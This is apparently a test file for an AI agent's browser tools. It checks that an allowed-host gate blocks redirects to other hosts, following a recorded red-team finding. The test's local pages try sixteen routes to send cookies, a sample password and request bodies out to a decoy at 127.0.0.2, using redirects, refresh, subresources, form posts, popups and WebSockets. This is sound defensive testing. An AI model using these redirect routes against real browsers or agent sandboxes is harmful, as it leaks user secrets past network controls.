// Adversary round 1, finding A2 (critical): the browser's request interception sees only the first URL of a redirect, so an allowed local page could send the
// browser to any host through a server-side 301/302/303/307/308, a chain of them, a Refresh header, or a redirect of a subresource, iframe, popup or form post.
// This test serves a decoy on 127.0.0.2 (not an allowed host) that records everything it receives, then tries every route there through the real browser tools.
// Controls: the decoy is reachable directly from this process (so the hit list works), and a redirect between allowed local URLs still works and is reported.
import { createServer, get as httpGet } from "node:http";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import assert from "node:assert";
import { BrowserSessionManager, __testHandlers } from "../dist/browser-tools.js";
import { EventBus } from "../dist/bus.js";

const decoyHits = [];
const decoy = createServer((req, res) => {
  const chunks = [];
  req.on("data", (c) => chunks.push(c));
  req.on("end", () => { decoyHits.push({ url: req.url, referer: req.headers.referer ?? "", cookie: req.headers.cookie ?? "", body: Buffer.concat(chunks).toString() }); res.writeHead(200, { "content-type": "text/html" }); res.end("<!doctype html><title>DECOY</title>decoy reached"); });
});
const noSecondLoopback = await new Promise((r) => { decoy.once("error", (e) => r(e.code)); decoy.listen(0, "127.0.0.2", () => r(null)); });
if (noSecondLoopback) { console.log(`[skip] 127.0.0.2 is not available here (${noSecondLoopback}); the off-list decoy cannot be started (macOS does not route it by default)`); process.exit(0); }
const D = `http://127.0.0.2:${decoy.address().port}`;

const app = createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  const page = (html) => { res.writeHead(200, { "content-type": "text/html", "set-cookie": "session=SECRET-COOKIE; Path=/" }); res.end(`<!doctype html><title>app</title>${html}`); };
  const redirect = (code, to) => { res.writeHead(code, { location: to }); res.end(); };
  const m = u.pathname.match(/^\/r\/(\d+)$/);
  if (m) return redirect(Number(m[1]), u.searchParams.get("to"));
  switch (u.pathname) {
    case "/chain": return redirect(302, `/r/301?to=${encodeURIComponent(`/r/307?to=${encodeURIComponent(D + "/chain-exfil?data=secret")}`)}`);
    case "/meta": return page(`<meta http-equiv="refresh" content="0;url=${D}/meta-exfil">meta`);
    case "/header-refresh": res.writeHead(200, { "content-type": "text/html", refresh: `0; url=${D}/header-refresh-exfil` }); return res.end("<!doctype html><title>app</title>hdr");
    case "/img": return page(`<img src="/r/302?to=${encodeURIComponent(D + "/img-exfil")}">img`);
    case "/script": return page(`<script src="/r/302?to=${encodeURIComponent(D + "/script-exfil.js")}"></script>script`);
    case "/xhr": return page(`<script>fetch("/r/307?to=${encodeURIComponent(D + "/xhr-exfil")}", {method:"POST", body:"secret-body"}).catch(()=>{})</script>xhr`);
    case "/iframe": return page(`<iframe src="/r/302?to=${encodeURIComponent(D + "/frame-exfil")}"></iframe>iframe`);
    case "/popup": return page(`<button id="p" onclick="window.open('/r/302?to=${encodeURIComponent(D + "/popup-exfil")}')">pop</button>`);
    case "/form": return page(`<form method="post" action="/r/307?to=${encodeURIComponent(D + "/form-exfil")}"><input name="pw" value="hunter2"></form><script>document.forms[0].submit()</script>`);
    case "/link": return page(`<a id="l" href="/r/302?to=${encodeURIComponent(D + "/link-exfil")}">go</a>`);
    case "/ws": return page(`<script>try{new WebSocket("ws://${D.slice(7)}/ws-exfil")}catch(e){}</script>ws`);
    case "/landed": return page(`<h1>Landed</h1>`);
    default: return page(`<h1>home</h1>`);
  }
});
await new Promise((r) => app.listen(0, "127.0.0.1", r));
const A = `http://127.0.0.1:${app.address().port}`;

const bus = new EventBus();
const events = [];
bus.on("event", (e) => events.push(e));
const sessions = new BrowserSessionManager();
const h = __testHandlers({ runId: "rg", bus, sessions, artifactDir: mkdtempSync(join(tmpdir(), "rg-art-")) });
const call = async (name, args = {}) => { try { const r = await h[name].handler(args, {}); return { text: r.content.map((c) => c.text ?? "").join("\n"), isError: !!r.isError }; } catch (e) { return { text: "THREW " + e.message, isError: true }; } };
const settle = (ms) => new Promise((r) => setTimeout(r, ms));
const fresh = async () => { await sessions.close("rg", bus, "completed").catch(() => {}); decoyHits.length = 0; };

try {
  // Control 1: the decoy records what reaches it (so an empty list below means something).
  await new Promise((resolve, reject) => httpGet(`${D}/direct`, (res) => { res.resume(); res.on("end", resolve); }).on("error", reject));
  assert.deepStrictEqual(decoyHits.map((h) => h.url), ["/direct"], "control: the decoy does not record requests");
  decoyHits.length = 0;

  // Control 2: a redirect between allowed local URLs works, lands where it should, and the agent is told it happened.
  {
    await fresh();
    const o = await call("open", { url: `${A}/r/302?to=${encodeURIComponent("/landed")}` });
    await settle(200);
    const i = await call("inspect");
    const shown = o.text + "\n" + i.text;
    assert.ok(!o.isError, `control: a local redirect failed: ${o.text}`);
    assert.ok(/Landed/.test(i.text), "control: did not land on the local target");
    assert.ok(/redirect/i.test(shown) && /\/landed/.test(shown), `the agent was not told it was redirected:\n${shown}`);
    assert.ok(events.some((e) => e.type === "browser-notice" && e.kind === "redirect" && /\/r\/302.*->.*\/landed/.test(e.text)), "no redirect notice was raised for a redirect of the page itself (the 'Landed on' line alone does not count)");
    console.log("[ok] control: a redirect between allowed local URLs works, lands, and is reported (redirect notice and 'Landed on')");
  }

  // The attacks. Each one must leave the decoy with zero requests, and the agent must be told something was refused.
  const attacks = [
    ["301 server-side redirect", async () => call("open", { url: `${A}/r/301?to=${encodeURIComponent(D + "/r301-exfil?data=secret")}` })],
    ["302", async () => call("open", { url: `${A}/r/302?to=${encodeURIComponent(D + "/r302-exfil?data=secret")}` })],
    ["303", async () => call("open", { url: `${A}/r/303?to=${encodeURIComponent(D + "/r303-exfil")}` })],
    ["307", async () => call("open", { url: `${A}/r/307?to=${encodeURIComponent(D + "/r307-exfil")}` })],
    ["308", async () => call("open", { url: `${A}/r/308?to=${encodeURIComponent(D + "/r308-exfil")}` })],
    ["three hops (302 -> 301 -> 307) ending off-list", async () => call("open", { url: `${A}/chain` })],
    ["meta refresh", async () => call("open", { url: `${A}/meta` })],
    ["Refresh header", async () => call("open", { url: `${A}/header-refresh` })],
    ["image whose URL redirects off-list", async () => call("open", { url: `${A}/img` })],
    ["script whose URL redirects off-list", async () => call("open", { url: `${A}/script` })],
    ["POST fetch redirected with 307 (body would follow)", async () => call("open", { url: `${A}/xhr` })],
    ["iframe whose URL redirects off-list", async () => call("open", { url: `${A}/iframe` })],
    ["form POST redirected with 307", async () => call("open", { url: `${A}/form` })],
    ["popup opened to a redirecting URL", async () => { await call("open", { url: `${A}/popup` }); return call("click", { selector: "#p" }); }],
    ["clicked link to a redirecting URL", async () => { await call("open", { url: `${A}/link` }); return call("click", { selector: "#l" }); }],
    ["WebSocket to the off-list host", async () => call("open", { url: `${A}/ws` })],
  ];
  for (const [name, run] of attacks) {
    await fresh();
    const first = await run();
    await settle(500);
    const second = await call("inspect");
    const shown = first.text + "\n" + second.text;
    assert.deepStrictEqual(decoyHits, [], `${name}: the off-list host received ${JSON.stringify(decoyHits)}`);
    assert.ok(/blocked|refused|not allowed|not on the allowed list/i.test(shown), `${name}: the agent was not told anything was refused:\n${shown.slice(0, 1800)}`);
    assert.ok(!/SECRET-COOKIE|hunter2|secret-body/.test(shown), `${name}: a secret appeared in what the agent was shown`);
  }
  console.log(`[ok] ${attacks.length} ways of reaching an off-list host through a redirect or a browser-made request: the decoy received nothing, and the agent was told each time`);

  // The gate is what is connecting, and it only ever connected to allowed hosts (the browser's own background traffic is refused too).
  {
    await fresh();
    await call("open", { url: `${A}/` });
    await settle(300);
    const gate = sessions.get("rg").gate;
    const hosts = [...gate.connectedHosts];
    assert.ok(hosts.length > 0 && hosts.every((x) => x === "127.0.0.1" || x === "localhost"), `the gate connected somewhere it should not have: ${hosts}`);
    console.log(`[ok] the gate only ever connected to: ${hosts.join(", ")} (${gate.deniedTotal} refused so far, including the browser's own background requests)`);
  }

  // The proxy credential is not something a page can use: a page cannot reach the gate's port with a working credential.
  {
    await fresh();
    await call("open", { url: `${A}/` });
    const gate = sessions.get("rg").gate;
    const res = await fetch(`${A}/`).catch(() => null); // the test process, not the browser: sanity that fetch works at all
    assert.ok(res && res.ok);
    const viaGate = await new Promise((resolve) => httpGet({ host: "127.0.0.1", port: gate.port, path: `${A}/`, headers: { host: new URL(A).host } }, (r) => { r.resume(); resolve(r.statusCode); }).on("error", () => resolve(0)));
    assert.strictEqual(viaGate, 407, "the gate served a request that carried no credential");
    console.log("[ok] a client without the gate's credential gets 407");
  }
} finally {
  await sessions.close("rg", bus, "completed").catch(() => {});
  app.close(); decoy.close();
}
console.log("\nALL BROWSER REDIRECT GATE TESTS PASSED");
process.exit(0);
